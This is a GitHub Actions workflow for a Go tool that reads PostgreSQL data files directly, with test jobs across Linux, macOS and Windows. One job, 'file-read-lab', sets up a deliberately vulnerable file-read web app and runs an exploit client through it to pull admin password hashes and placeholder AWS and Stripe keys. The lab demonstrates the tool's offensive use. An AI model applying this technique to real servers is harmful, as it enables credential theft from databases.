name: Test

on:
  push:
    branches: [master, main]
  pull_request:
    branches: [master, main]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with:
          go-version: '1.22'
      
      - name: Run tests with coverage
        run: go test -v -race -coverprofile=coverage.out -covermode=atomic ./...
      
      - name: Display coverage
        run: |
          go tool cover -func=coverage.out
          echo "=== Coverage Summary ==="
          go tool cover -func=coverage.out | grep total
      
      - name: Upload coverage artifact
        uses: actions/upload-artifact@v4
        with:
          name: coverage-unit
          path: coverage.out

  # Linux integration tests with Docker
  integration-linux:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        pg: ['12', '13', '14', '15', '16', '17']
    
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-go@v5
        with:
          go-version: '1.22'

      - name: Build binary
        run: |
          CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o pgread .

      - name: Start PostgreSQL ${{ matrix.pg }}
        run: |
          docker run -d --name pg \
            -e POSTGRES_PASSWORD=testpass \
            -e POSTGRES_DB=testdb \
            postgres:${{ matrix.pg }}
          
          # Wait for PostgreSQL to be ready
          for i in {1..30}; do
            docker exec pg pg_isready -U postgres && break
            sleep 1
          done

      - name: Create test data
        run: |
          # Ensure testdb exists
          docker exec pg psql -U postgres -c "CREATE DATABASE testdb;" || true
          
          # Create basic tables
          docker exec pg psql -U postgres -d testdb -c "CREATE TABLE users (id SERIAL PRIMARY KEY, email VARCHAR(255), password_hash VARCHAR(255), is_admin BOOLEAN DEFAULT false);"
          docker exec pg psql -U postgres -d testdb -c "INSERT INTO users (email, password_hash, is_admin) VALUES ('admin@test.com', '\$argon2id\$v=19\$m=4096,t=3,p=1\$salt\$hash', true);"
          docker exec pg psql -U postgres -d testdb -c "INSERT INTO users (email, password_hash, is_admin) VALUES ('user1@test.com', '\$argon2id\$v=19\$m=4096,t=3,p=1\$salt\$hash2', false);"
          
          docker exec pg psql -U postgres -d testdb -c "CREATE TABLE secrets (id SERIAL PRIMARY KEY, name VARCHAR(255), value JSONB);"
          docker exec pg psql -U postgres -d testdb -c "INSERT INTO secrets (name, value) VALUES ('aws_credentials', '{\"access_key\": \"AKIAIOSFODNN7EXAMPLE\", \"secret_key\": \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\"}');"
          
          # Create all_types table to test every PostgreSQL type
          docker exec pg psql -U postgres -d testdb -c "
            CREATE TABLE all_types (
              -- Numeric types
              col_bool BOOLEAN,
              col_int2 SMALLINT,
              col_int4 INTEGER,
              col_int8 BIGINT,
              col_float4 REAL,
              col_float8 DOUBLE PRECISION,
              col_numeric NUMERIC(10,2),
              col_money MONEY,
              -- Text types
              col_char CHAR(10),
              col_varchar VARCHAR(255),
              col_text TEXT,
              col_bytea BYTEA,
              -- Date/Time types
              col_date DATE,
              col_time TIME,
              col_timetz TIMETZ,
              col_timestamp TIMESTAMP,
              col_timestamptz TIMESTAMPTZ,
              col_interval INTERVAL,
              -- Network types
              col_inet INET,
              col_cidr CIDR,
              col_macaddr MACADDR,
              col_macaddr8 MACADDR8,
              -- Geometric types
              col_point POINT,
              col_line LINE,
              col_lseg LSEG,
              col_box BOX,
              col_circle CIRCLE,
              col_path PATH,
              col_polygon POLYGON,
              -- Structured types
              col_uuid UUID,
              col_json JSON,
              col_jsonb JSONB,
              col_xml XML,
              -- Bit types
              col_bit BIT(8),
              col_varbit VARBIT(16),
              -- Range types
              col_int4range INT4RANGE,
              col_int8range INT8RANGE,
              col_numrange NUMRANGE,
              col_daterange DATERANGE,
              col_tsrange TSRANGE,
              col_tstzrange TSTZRANGE,
              -- Array types
              col_int_array INTEGER[],
              col_text_array TEXT[]
            );"
          
          # Insert test data for all types
          docker exec pg psql -U postgres -d testdb -c "
            INSERT INTO all_types VALUES (
              -- Numeric
              true, 42, 1337, 9223372036854775807, 3.14, 2.718281828,
              12345.67, '\$99.99',
              -- Text
              'hello', 'world', 'lorem ipsum', E'\\\\xDEADBEEF',
              -- Date/Time
              '2025-01-18', '14:30:00', '14:30:00+02', 
              '2025-01-18 14:30:00', '2025-01-18 14:30:00+00',
              '1 year 2 months 3 days',
              -- Network
              '192.168.1.1', '10.0.0.0/8', 'aa:bb:cc:dd:ee:ff', 'aa:bb:cc:dd:ee:ff:00:11',
              -- Geometric
              '(1,2)', '{1,2,3}', '[(0,0),(1,1)]', '(0,0),(1,1)',
              '<(0,0),5>', '((0,0),(1,1),(2,0))', '((0,0),(1,1),(1,0))',
              -- Structured
              'a0eebc99-9c0b-4ef8-bb6d-6bb9bd380a11',
              '{\"key\": \"value\"}', '{\"nested\": {\"secret\": \"password123\"}}',
              '<root><item>test</item></root>',
              -- Bit
              B'10101010', B'1100110011',
              -- Range
              '[1,10)', '[100,1000)', '[1.5,2.5)', '[2025-01-01,2025-12-31)',
              '[2025-01-01 00:00,2025-12-31 23:59)', '[2025-01-01 00:00+00,2025-12-31 23:59+00)',
              -- Arrays
              ARRAY[1,2,3,4,5], ARRAY['a','b','c']
            );"
          
          # Verify tables were created
          docker exec pg psql -U postgres -d testdb -c "\dt"
          docker exec pg psql -U postgres -d testdb -c "SELECT * FROM all_types;"
          
          # Checkpoint and stop to flush
          docker exec pg psql -U postgres -c "CHECKPOINT;"
          docker stop pg
          sleep 2
          docker start pg
          
          # Wait for ready
          for i in {1..30}; do
            docker exec pg pg_isready -U postgres && break
            sleep 1
          done

      - name: Copy binary to container
        run: docker cp pgread pg:/usr/local/bin/

      - name: Debug PostgreSQL
        run: |
          echo "=== PostgreSQL data directory ==="
          docker exec pg ls -la /var/lib/postgresql/data/
          docker exec pg ls -la /var/lib/postgresql/data/global/ | head -10
          docker exec pg ls -la /var/lib/postgresql/data/base/
          
          echo "=== PostgreSQL version ==="
          docker exec pg psql -U postgres -c "SELECT version();"
          
          echo "=== Databases ==="
          docker exec pg psql -U postgres -c "SELECT oid, datname FROM pg_database;"

      - name: Verify testdb exists in pg_database
        run: |
          echo "=== Databases in pg_database file ==="
          docker exec pg pgread -d /var/lib/postgresql/data/ -list-db
          
          echo "=== Verify testdb is present ==="
          docker exec pg pgread -d /var/lib/postgresql/data/ -list-db | grep -q testdb || {
            echo "ERROR: testdb not found in pg_database!"
            echo "=== Raw pg_database file ==="
            docker exec pg xxd /var/lib/postgresql/data/global/1262 | head -100
            exit 1
          }
          echo "testdb found!"

      - name: Debug and Test
        run: |
          echo "=== 1. Tables in testdb via psql ==="
          docker exec pg psql -U postgres -d testdb -c "\dt"
          
          echo "=== 2. Get testdb OID ==="
          TESTDB_OID=$(docker exec pg psql -U postgres -tAc "SELECT oid FROM pg_database WHERE datname='testdb'")
          echo "testdb OID: $TESTDB_OID"
          
          echo "=== 3. List files in testdb directory ==="
          docker exec pg ls -la /var/lib/postgresql/data/base/$TESTDB_OID/ | head -20
          
          echo "=== 4. Parse pg_class directly ==="
          docker exec pg pgread -f /var/lib/postgresql/data/base/$TESTDB_OID/1259 2>&1 | grep -E "(users|secrets|all_types|Table:)" | head -20
          
          echo "=== 5. Full dump of testdb ==="
          docker exec pg pgread -d /var/lib/postgresql/data/ -db testdb 2>&1 | head -200
          
          echo "=== 6. Verify tables exist ==="
          docker exec pg pgread -d /var/lib/postgresql/data/ -db testdb | jq '.databases[0].tables[]?.name' | head -20

      - name: Verify all types parsing
        run: |
          echo "=== Dumping all_types table ==="
          OUTPUT=$(docker exec pg pgread -d /var/lib/postgresql/data/ -db testdb -t all_types)
          
          # Show key columns for debugging
          echo "$OUTPUT" | jq '{
            col_bool, col_int2, col_int4, col_int8, col_float4, col_float8,
            col_numeric, col_money, col_char, col_varchar, col_text, col_bytea,
            col_date, col_inet, col_cidr, col_macaddr, col_macaddr8,
            col_point, col_uuid, col_json, col_jsonb,
            col_int4range, col_int_array, col_text_array
          }' <<< "$(echo "$OUTPUT" | jq '.databases[0].tables[0].rows[0]')"
          
          echo "=== Verifying type parsing (STRICT) ==="
          ROW='.databases[0].tables[0].rows[0]'
          
          # Numeric types - exact values
          echo "$OUTPUT" | jq -e "$ROW.col_bool == true" || { echo "FAIL: col_bool != true"; exit 1; }
          echo "$OUTPUT" | jq -e "$ROW.col_int2 == 42" || { echo "FAIL: col_int2 != 42"; exit 1; }
          echo "$OUTPUT" | jq -e "$ROW.col_int4 == 1337" || { echo "FAIL: col_int4 != 1337"; exit 1; }
          echo "$OUTPUT" | jq -e "$ROW.col_int8 == 9223372036854775807" || { echo "FAIL: col_int8"; exit 1; }
          echo "$OUTPUT" | jq -e "($ROW.col_float4 | . > 3.13 and . < 3.15)" || { echo "FAIL: col_float4 != ~3.14"; exit 1; }
          echo "$OUTPUT" | jq -e "($ROW.col_float8 | . > 2.71 and . < 2.72)" || { echo "FAIL: col_float8 != ~2.718"; exit 1; }
          echo "$OUTPUT" | jq -e "$ROW.col_numeric == 12345.67" || { echo "FAIL: col_numeric != 12345.67"; exit 1; }
          echo "$OUTPUT" | jq -e "$ROW.col_money == \"\$99.99\"" || { echo "FAIL: col_money != \$99.99"; exit 1; }
          echo "Numeric types: OK"
          
          # Text types - exact values
          echo "$OUTPUT" | jq -e "$ROW.col_char == \"hello     \"" || { echo "FAIL: col_char != 'hello     '"; exit 1; }
          echo "$OUTPUT" | jq -e "$ROW.col_varchar == \"world\"" || { echo "FAIL: col_varchar != 'world'"; exit 1; }
          echo "$OUTPUT" | jq -e "$ROW.col_text == \"lorem ipsum\"" || { echo "FAIL: col_text != 'lorem ipsum'"; exit 1; }
          echo "$OUTPUT" | jq -e "$ROW.col_bytea != null" || { echo "FAIL: col_bytea is null"; exit 1; }
          echo "Text types: OK"
          
          # Date/time types - exact values
          echo "$OUTPUT" | jq -e "$ROW.col_date == \"2025-01-18\"" || { echo "FAIL: col_date != 2025-01-18"; exit 1; }
          echo "$OUTPUT" | jq -e "($ROW.col_time | startswith(\"14:30\"))" || { echo "FAIL: col_time != 14:30:xx"; exit 1; }
          echo "$OUTPUT" | jq -e "($ROW.col_timestamp | startswith(\"2025-01-18\"))" || { echo "FAIL: col_timestamp"; exit 1; }
          echo "Date/Time types: OK"
          
          # Network types - exact values
          echo "$OUTPUT" | jq -e "($ROW.col_inet | contains(\"192.168.1.1\"))" || { echo "FAIL: col_inet != 192.168.1.1"; exit 1; }
          echo "$OUTPUT" | jq -e "($ROW.col_cidr | contains(\"10.0.0.0\"))" || { echo "FAIL: col_cidr"; exit 1; }
          echo "$OUTPUT" | jq -e "$ROW.col_macaddr == \"aa:bb:cc:dd:ee:ff\"" || { echo "FAIL: col_macaddr"; exit 1; }
          echo "Network types: OK"
          
          # Geometric types - check structure
          echo "$OUTPUT" | jq -e "($ROW.col_point | contains(\"1\") and contains(\"2\"))" || { echo "FAIL: col_point != (1,2)"; exit 1; }
          echo "$OUTPUT" | jq -e "($ROW.col_circle | contains(\"5\"))" || { echo "FAIL: col_circle"; exit 1; }
          echo "Geometric types: OK"
          
          # UUID - exact format
          echo "$OUTPUT" | jq -e "$ROW.col_uuid | test(\"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$\")" || { echo "FAIL: col_uuid format"; exit 1; }
          echo "UUID: OK"
          
          # JSON/JSONB - exact nested parsing
          echo "$OUTPUT" | jq -e "$ROW.col_json.key == \"value\"" || { echo "FAIL: col_json.key != value"; exit 1; }
          echo "$OUTPUT" | jq -e "$ROW.col_jsonb.nested.secret == \"password123\"" || { echo "FAIL: col_jsonb.nested.secret"; exit 1; }
          echo "JSON/JSONB: OK"
          
          # Range types - check format
          echo "$OUTPUT" | jq -e "($ROW.col_int4range | contains(\"1\") and contains(\"10\"))" || { echo "FAIL: col_int4range"; exit 1; }
          echo "$OUTPUT" | jq -e "($ROW.col_daterange | contains(\"2025\"))" || { echo "FAIL: col_daterange"; exit 1; }
          echo "Range types: OK"
          
          # Arrays - check content
          echo "$OUTPUT" | jq -e "$ROW.col_int_array == [1,2,3,4,5]" || { echo "FAIL: col_int_array != [1,2,3,4,5]"; exit 1; }
          echo "$OUTPUT" | jq -e "$ROW.col_text_array == [\"a\",\"b\",\"c\"]" || { echo "FAIL: col_text_array"; exit 1; }
          echo "Array types: OK"
          
          echo "=== ALL TYPE TESTS PASSED ==="

      - name: Run integration tests with coverage
        if: matrix.pg == '16'
        run: |
          # Copy test data from container to host
          docker cp pg:/var/lib/postgresql/data /tmp/pgdata
          
          # Run tests with real PostgreSQL data
          PGDUMP_TESTDATA=/tmp/pgdata go test -v -coverprofile=coverage-integration.out -covermode=atomic ./pgdump/...
          
          echo "=== Integration Coverage ==="
          go tool cover -func=coverage-integration.out | grep total

      - name: Upload integration coverage artifact
        if: matrix.pg == '16'
        uses: actions/upload-artifact@v4
        with:
          name: coverage-integration
          path: coverage-integration.out

      - name: Cleanup
        if: always()
        run: docker rm -f pg || true

  # macOS integration test
  integration-macos:
    runs-on: macos-latest
    strategy:
      fail-fast: false
      matrix:
        pg: ['15', '16', '17']  # Only supported versions (12-14 deprecated on Homebrew)
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-go@v5
        with:
          go-version: '1.22'

      - name: Install PostgreSQL ${{ matrix.pg }}
        run: |
          brew install postgresql@${{ matrix.pg }}
          brew services start postgresql@${{ matrix.pg }}
          sleep 5
          
          # Find the right path
          if [ -d /opt/homebrew/opt/postgresql@${{ matrix.pg }} ]; then
            PG_PATH=/opt/homebrew/opt/postgresql@${{ matrix.pg }}/bin
          else
            PG_PATH=/usr/local/opt/postgresql@${{ matrix.pg }}/bin
          fi
          echo "PG_PATH=$PG_PATH" >> $GITHUB_ENV
          
          # Create test database
          $PG_PATH/createdb -h localhost testdb

      - name: Create test data
        run: |
          $PG_PATH/psql -h localhost -c "CREATE TABLE users (id SERIAL, email VARCHAR(255), password_hash VARCHAR(255));" testdb
          $PG_PATH/psql -h localhost -c "INSERT INTO users (email, password_hash) VALUES ('admin@test.com', 'argon2hash');" testdb
          $PG_PATH/psql -h localhost -c "CREATE TABLE secrets (id SERIAL, name VARCHAR(255), value JSONB);" testdb
          $PG_PATH/psql -h localhost -c "INSERT INTO secrets (name, value) VALUES ('aws', '{\"key\": \"AKIA\"}');" testdb
          
          # Test multiple types
          $PG_PATH/psql -h localhost -c "CREATE TABLE type_test (col_int INTEGER, col_text TEXT, col_bool BOOLEAN, col_float DOUBLE PRECISION, col_uuid UUID, col_inet INET, col_point POINT, col_jsonb JSONB, col_date DATE);" testdb
          $PG_PATH/psql -h localhost -c "INSERT INTO type_test VALUES (42, 'test', true, 3.14, 'a0eebc99-9c0b-4ef8-bb6d-6bb9bd380a11', '192.168.1.1', '(1,2)', '{\"secret\": \"pass\"}', '2025-01-18');" testdb
          
          # Verify data is in database
          echo "=== Data in PostgreSQL ==="
          $PG_PATH/psql -h localhost -c "SELECT * FROM type_test;" testdb
          
          # Find data directory
          if [ -d /opt/homebrew/var/postgresql@${{ matrix.pg }} ]; then
            PGDATA=/opt/homebrew/var/postgresql@${{ matrix.pg }}
          else
            PGDATA=/usr/local/var/postgresql@${{ matrix.pg }}
          fi
          echo "PGDATA=$PGDATA" >> $GITHUB_ENV
          
          # Force checkpoint then STOP PostgreSQL completely (this flushes everything to disk)
          $PG_PATH/psql -h localhost -c "CHECKPOINT;" testdb
          $PG_PATH/pg_ctl stop -D "$PGDATA" -m fast -w
          
          echo "PostgreSQL stopped - data should be on disk now"
          ls -la "$PGDATA/base/"

      - name: Build
        run: go build -o pgread .

      - name: Test (PostgreSQL stopped)
        run: |
          echo "=== Testing -detect ==="
          ./pgread -detect
          
          echo "=== Testing with explicit data dir ==="
          ./pgread -d "$PGDATA" -list-db
          
          echo "=== Testing dump ==="
          ./pgread -d "$PGDATA" -db testdb -t users | jq .
          
          echo "=== Testing type_test table ==="
          OUTPUT=$(./pgread -d "$PGDATA" -db testdb -t type_test)
          echo "$OUTPUT" | jq .
          
          # Check row_count
          ROW_COUNT=$(echo "$OUTPUT" | jq '.databases[0].tables[0].row_count')
          echo "Row count: $ROW_COUNT"
          if [ "$ROW_COUNT" -eq 0 ]; then
            echo "ERROR: No rows found"
            echo "=== Debug: listing heap files ==="
            ls -la "$PGDATA/base/"
            DBOID=$(./pgread -d "$PGDATA" -list-db | grep testdb | grep -oE '[0-9]+' | head -1)
            echo "testdb OID: $DBOID"
            ls -la "$PGDATA/base/$DBOID/" | head -20
            exit 1
          fi
          
          echo "$OUTPUT" | jq -e '.databases[0].tables[0].rows[0].col_int == 42' || { echo "FAIL: int"; exit 1; }
          echo "$OUTPUT" | jq -e '.databases[0].tables[0].rows[0].col_jsonb.secret == "pass"' || { echo "FAIL: jsonb"; exit 1; }
          echo "=== macOS type tests PASSED ==="

      - name: Run integration tests with coverage
        if: matrix.pg == '16'
        run: |
          # Run tests with real PostgreSQL data
          PGDUMP_TESTDATA="$PGDATA" go test -v -coverprofile=coverage-macos.out -covermode=atomic ./pgdump/...
          
          echo "=== macOS Coverage ==="
          go tool cover -func=coverage-macos.out | grep total

      - name: Upload macOS coverage artifact
        if: matrix.pg == '16'
        uses: actions/upload-artifact@v4
        with:
          name: coverage-macos
          path: coverage-macos.out

  # Windows integration test - using official PostgreSQL binaries
  integration-windows:
    runs-on: windows-latest
    strategy:
      fail-fast: false
      matrix:
        pg: ['15', '16']
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-go@v5
        with:
          go-version: '1.22'

      - name: Cache PostgreSQL binaries
        uses: actions/cache@v4
        id: pg-cache
        with:
          path: ${{ github.workspace }}/pgsql
          key: postgresql-${{ matrix.pg }}-windows-x64

      - name: Download PostgreSQL ${{ matrix.pg }}
        if: steps.pg-cache.outputs.cache-hit != 'true'
        shell: pwsh
        run: |
          # Download official PostgreSQL binaries (no installer, just zip)
          $pgVersion = "${{ matrix.pg }}"
          $pgFullVersion = if ($pgVersion -eq "16") { "16.6-1" } else { "15.10-1" }
          $url = "https://get.enterprisedb.com/postgresql/postgresql-$pgFullVersion-windows-x64-binaries.zip"
          
          Write-Host "Downloading PostgreSQL from $url"
          Invoke-WebRequest -Uri $url -OutFile pg.zip
          
          Write-Host "Extracting..."
          Expand-Archive -Path pg.zip -DestinationPath $env:GITHUB_WORKSPACE

      - name: Setup and start PostgreSQL
        shell: pwsh
        run: |
          $pgPath = "$env:GITHUB_WORKSPACE\pgsql\bin"
          $pgData = "$env:GITHUB_WORKSPACE\pgdata"
          $pgLog = "$env:GITHUB_WORKSPACE\pg.log"
          
          echo "PG_PATH=$pgPath" >> $env:GITHUB_ENV
          echo "PGDATA=$pgData" >> $env:GITHUB_ENV
          echo "$pgPath" >> $env:GITHUB_PATH
          
          # Initialize database in workspace directory (has proper permissions)
          Write-Host "Initializing database in $pgData..."
          & "$pgPath\initdb" -D $pgData -U postgres -A trust -E UTF8
          
          # Configure PostgreSQL to listen on localhost and force sync writes
          Add-Content -Path "$pgData\postgresql.conf" -Value "listen_addresses = 'localhost'"
          Add-Content -Path "$pgData\postgresql.conf" -Value "port = 5432"
          Add-Content -Path "$pgData\postgresql.conf" -Value "fsync = on"
          Add-Content -Path "$pgData\postgresql.conf" -Value "synchronous_commit = on"
          Add-Content -Path "$pgData\postgresql.conf" -Value "full_page_writes = on"
          
          # Start PostgreSQL
          Write-Host "Starting PostgreSQL..."
          & "$pgPath\pg_ctl" start -D $pgData -l $pgLog -w -t 60
          
          # Check log if failed
          if ($LASTEXITCODE -ne 0) {
            Write-Host "=== PostgreSQL log ==="
            Get-Content $pgLog -ErrorAction SilentlyContinue
            exit 1
          }
          
          # Verify
          & "$pgPath\psql" -U postgres -c "SELECT version();"

      - name: Create test data
        shell: pwsh
        run: |
          & "$env:PG_PATH\psql" -U postgres -c "CREATE DATABASE testdb;"
          & "$env:PG_PATH\psql" -U postgres -d testdb -c "CREATE TABLE users (id SERIAL, email VARCHAR(255), password_hash VARCHAR(255));"
          & "$env:PG_PATH\psql" -U postgres -d testdb -c "INSERT INTO users (email, password_hash) VALUES ('admin@test.com', 'argon2hash');"
          
          # Test multiple types - use single quotes for JSON to avoid PowerShell escaping issues
          & "$env:PG_PATH\psql" -U postgres -d testdb -c "CREATE TABLE type_test (col_int INTEGER, col_text TEXT, col_bool BOOLEAN, col_float DOUBLE PRECISION, col_uuid UUID, col_inet INET, col_point POINT, col_jsonb JSONB, col_date DATE);"
          
          # Use a variable for the SQL to handle JSON properly
          $sql = "INSERT INTO type_test VALUES (42, 'test', true, 3.14, 'a0eebc99-9c0b-4ef8-bb6d-6bb9bd380a11', '192.168.1.1', '(1,2)', '{""secret"": ""pass""}', '2025-01-18');"
          & "$env:PG_PATH\psql" -U postgres -d testdb -c $sql
          
          # Verify data is in database
          Write-Host "=== Verifying data in database ==="
          & "$env:PG_PATH\psql" -U postgres -d testdb -c "SELECT * FROM type_test;"
          & "$env:PG_PATH\psql" -U postgres -d testdb -c "SELECT count(*) FROM type_test;"
          
          # Get database OID for debugging
          Write-Host "=== Database OIDs ==="
          & "$env:PG_PATH\psql" -U postgres -c "SELECT oid, datname FROM pg_database;"
          
          # Get table info
          Write-Host "=== Table info ==="
          & "$env:PG_PATH\psql" -U postgres -d testdb -c "SELECT oid, relname, relfilenode FROM pg_class WHERE relname = 'type_test';"
          
          # Force multiple checkpoints and sync
          & "$env:PG_PATH\psql" -U postgres -c "CHECKPOINT;"
          & "$env:PG_PATH\psql" -U postgres -c "CHECKPOINT;"
          Start-Sleep -Seconds 2
          
          # Stop PostgreSQL with smart mode first, then fast to ensure clean shutdown
          Write-Host "=== Stopping PostgreSQL ==="
          & "$env:PG_PATH\pg_ctl" stop -D $env:PGDATA -m fast -w
          Start-Sleep -Seconds 5
          
          # Verify files exist
          Write-Host "=== Checking data files ==="
          Get-ChildItem -Path "$env:PGDATA\base" -Directory | ForEach-Object { 
            Write-Host "Database OID: $($_.Name)"
            Get-ChildItem -Path $_.FullName -File | Select-Object -First 10 | ForEach-Object { Write-Host "  $($_.Name) - $($_.Length) bytes" }
          }
          Write-Host "PostgreSQL stopped - data should be on disk"

      - name: Build
        run: go build -o pgread.exe .

      - name: Test (PostgreSQL stopped)
        shell: pwsh
        run: |
          Write-Host "=== Testing -detect ==="
          .\pgread.exe -detect
          
          Write-Host "=== Testing with explicit data dir ==="
          .\pgread.exe -d "$env:PGDATA" -list-db
          
          Write-Host "=== Testing dump ==="
          .\pgread.exe -d "$env:PGDATA" -db testdb -t users
          
          Write-Host "=== Testing type_test table ==="
          $output = .\pgread.exe -d "$env:PGDATA" -db testdb -t type_test
          $output
          $json = $output | ConvertFrom-Json
          
          $rowCount = $json.databases[0].tables[0].row_count
          Write-Host "Row count: $rowCount"
          if ($rowCount -eq 0) {
            throw "No rows found - data not flushed to disk"
          }
          
          if ($json.databases[0].tables[0].rows[0].col_int -ne 42) { throw "FAIL: int" }
          if ($json.databases[0].tables[0].rows[0].col_jsonb.secret -ne "pass") { throw "FAIL: jsonb" }
          Write-Host "=== Windows type tests PASSED ==="

      - name: Run integration tests with coverage
        if: matrix.pg == '16'
        shell: pwsh
        run: |
          $env:PGDUMP_TESTDATA = $env:PGDATA
          go test -v -coverprofile=coverage-windows.out -covermode=atomic ./pgdump/...
          
          Write-Host "=== Windows Coverage ==="
          go tool cover -func=coverage-windows.out | Select-String "total:"

      - name: Upload Windows coverage artifact
        if: matrix.pg == '16'
        uses: actions/upload-artifact@v4
        with:
          name: coverage-windows
          path: coverage-windows.out

  # File read exploitation lab - proves the library works for real-world scenarios
  file-read-lab:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with:
          go-version: '1.22'

      - name: Start PostgreSQL with test data
        run: |
          # Create data directory with proper permissions
          mkdir -p /tmp/pgdata
          chmod 777 /tmp/pgdata
          
          docker run -d --name pg \
            -e POSTGRES_HOST_AUTH_METHOD=trust \
            -v /tmp/pgdata:/var/lib/postgresql/data \
            postgres:16
          
          # Wait for PostgreSQL to be fully initialized
          echo "Waiting for PostgreSQL initialization..."
          for i in {1..60}; do
            docker exec pg pg_isready -U postgres && break
            sleep 1
          done
          sleep 5  # Extra wait for full initialization
          
          # Create test database with sensitive data
          docker exec pg psql -U postgres -c "CREATE DATABASE targetapp;"
          docker exec pg psql -U postgres -d targetapp -c "
            CREATE TABLE users (
              id SERIAL PRIMARY KEY,
              username VARCHAR(50),
              email VARCHAR(100),
              password_hash VARCHAR(255)
            );
            INSERT INTO users (username, email, password_hash) VALUES
              ('admin', 'admin@corp.local', '\$argon2id\$v=19\$m=65536\$hash1'),
              ('john.doe', 'john@corp.local', '\$argon2id\$v=19\$m=65536\$hash2');
            
            CREATE TABLE api_keys (
              id SERIAL PRIMARY KEY,
              service VARCHAR(50),
              credentials JSONB
            );
            INSERT INTO api_keys (service, credentials) VALUES
              ('aws', '{\"access_key\": \"AKIAIOSFODNN7EXAMPLE\", \"secret_key\": \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\"}'),
              ('stripe', '{\"api_key\": \"sk_live_abc123\"}');
          "
          
          # Verify data was inserted
          docker exec pg psql -U postgres -d targetapp -c "SELECT * FROM users;"
          docker exec pg psql -U postgres -d targetapp -c "SELECT * FROM api_keys;"
          
          # Flush to disk and stop PostgreSQL
          docker exec pg psql -U postgres -c "CHECKPOINT;"
          docker stop pg
          sleep 3
          
          # Fix permissions - Docker creates files as postgres user
          sudo chmod -R 755 /tmp/pgdata
          sudo chown -R $(id -u):$(id -g) /tmp/pgdata
          
          # Verify files exist on host
          echo "=== Checking PostgreSQL files on host ==="
          ls -la /tmp/pgdata/
          ls -la /tmp/pgdata/global/
          ls -la /tmp/pgdata/base/
          
          # Find pg_database file
          echo "=== pg_database location ==="
          find /tmp/pgdata -name "1262" 2>/dev/null

      - name: Start vulnerable web app
        run: |
          # Build and run vulnerable app
          cd examples/file-read-lab/vuln-app
          go build -o vulnerable_app .
          ./vulnerable_app &
          sleep 2
          
          # Test the vulnerable endpoint
          curl -s "http://localhost:8080/read?path=/etc/hostname" && echo " [OK: File read works]"

      - name: Exploit via pgdump library
        run: |
          cd examples/file-read-lab/exploit-client
          go build -o exploit .
          
          echo "=== Exploiting file read vulnerability to dump PostgreSQL ==="
          OUTPUT=$(./exploit -url "http://localhost:8080/read?path=" -pgdata /tmp/pgdata -db targetapp)
          echo "$OUTPUT" | jq .
          
          echo "=== Verifying exfiltrated data ==="
          
          # Check we got the users table
          echo "$OUTPUT" | jq -e '.databases[0].tables[] | select(.name == "users")' || { echo "FAIL: users table not found"; exit 1; }
          echo "Found users table: OK"
          
          # Check we got admin credentials
          echo "$OUTPUT" | jq -e '.databases[0].tables[] | select(.name == "users") | .rows[] | select(.username == "admin")' || { echo "FAIL: admin user not found"; exit 1; }
          echo "Found admin user: OK"
          
          # Check we got API keys with secrets
          echo "$OUTPUT" | jq -e '.databases[0].tables[] | select(.name == "api_keys") | .rows[] | select(.service == "aws") | .credentials.access_key' | grep -q "AKIA" || { echo "FAIL: AWS key not found"; exit 1; }
          echo "Found AWS credentials: OK"
          
          echo "$OUTPUT" | jq -e '.databases[0].tables[] | select(.name == "api_keys") | .rows[] | select(.service == "stripe") | .credentials.api_key' | grep -q "sk_live" || { echo "FAIL: Stripe key not found"; exit 1; }
          echo "Found Stripe credentials: OK"
          
          echo "=== FILE READ LAB PASSED - Library works for real exploitation ==="

      - name: Cleanup
        if: always()
        run: docker rm -f pg || true

  # Upload coverage to Codecov
  coverage:
    runs-on: ubuntu-latest
    needs: [unit-tests, integration-linux, integration-macos, integration-windows]
    steps:
      - uses: actions/checkout@v4

      - name: Download unit coverage
        uses: actions/download-artifact@v4
        with:
          name: coverage-unit
          path: coverage-reports

      - name: Download Linux integration coverage
        uses: actions/download-artifact@v4
        with:
          name: coverage-integration
          path: coverage-reports

      - name: Download macOS integration coverage
        uses: actions/download-artifact@v4
        with:
          name: coverage-macos
          path: coverage-reports
        continue-on-error: true

      - name: Download Windows integration coverage
        uses: actions/download-artifact@v4
        with:
          name: coverage-windows
          path: coverage-reports
        continue-on-error: true

      - name: List coverage files
        run: ls -la coverage-reports/

      - name: Upload coverage to Codecov
        uses: codecov/codecov-action@v4
        with:
          token: ${{ secrets.CODECOV_TOKEN }}
          directory: ./coverage-reports/
          fail_ci_if_error: false
          verbose: true

  build:
    runs-on: ubuntu-latest
    needs: [unit-tests, integration-linux, integration-macos, integration-windows, file-read-lab]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with:
          go-version: '1.22'

      - name: Build all platforms
        run: |
          mkdir -p dist
          GOOS=linux GOARCH=amd64 go build -o dist/pgread-linux-amd64 .
          GOOS=darwin GOARCH=amd64 go build -o dist/pgread-darwin-amd64 .
          GOOS=darwin GOARCH=arm64 go build -o dist/pgread-darwin-arm64 .
          GOOS=windows GOARCH=amd64 go build -o dist/pgread-windows-amd64.exe .

      - uses: actions/upload-artifact@v4
        with:
          name: binaries
          path: dist/
